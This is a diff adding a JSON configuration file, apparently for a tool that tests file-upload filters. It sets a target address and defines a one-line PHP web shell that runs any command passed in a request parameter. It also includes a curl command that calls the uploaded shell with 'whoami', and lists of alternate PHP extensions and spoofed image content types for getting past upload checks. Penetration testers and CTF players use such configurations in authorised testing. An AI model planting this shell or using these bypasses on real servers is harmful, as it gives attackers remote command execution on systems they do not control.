@@ -1,0 +1,34 @@
+{
+    "TARGET":"155.55.155.55:12345",
+    "SCRIPT_FILE_TYPE_NAME":"PHP",
+    "SCRIPT":"<?php system($_REQUEST['cmd']); ?>",
+    "WEBSHELL_COMMAND":"whoami",
+    "CURL_FILE":"post_curl.txt",
+    "WEBSHELL_TEST":[
+		"curl",
+		"http://TARGET/files/shellEXTENSION?cmd=WEBSHELL_COMMAND"
+    ],
+    "FILETYPES":[
+		{
+			"TYPE_NAME":"PHP",
+			"TYPE_EXTENSIONS":[".php",".php2",".php3",".php4",".php5",".php6",".php7",".phps",".pht",".phtml",".pl",".phar"],
+			"TYPE_CONTENT_HEADERS":["application/x-httpd-php","application/x-php"]
+		},
+		{
+			"TYPE_NAME":"GIF",
+			"TYPE_EXTENSIONS":[".gif"],
+			"TYPE_CONTENT_HEADERS":["image/gif","image/vnd.sealedmedia.softseal.gif"]
+		},
+		{
+			"TYPE_NAME":"PNG",
+			"TYPE_EXTENSIONS":[".png"],
+			"TYPE_CONTENT_HEADERS":["image/apng","image/png","image/vnd.mozilla.apng","image/vnd.sealed.png","image/x-citrix-png","image/x-png"]
+		},
+		{
+			"TYPE_NAME":"JPG",
+			"TYPE_EXTENSIONS":[".jp2",".jpg",".j2k",".jpf",".jpm",".jpg2",".j2c",".jpc",".jpx",".mj2",".jpeg"],
+			"TYPE_CONTENT_HEADERS":["image/jpeg"]
+		}
+	]	
+    
+}
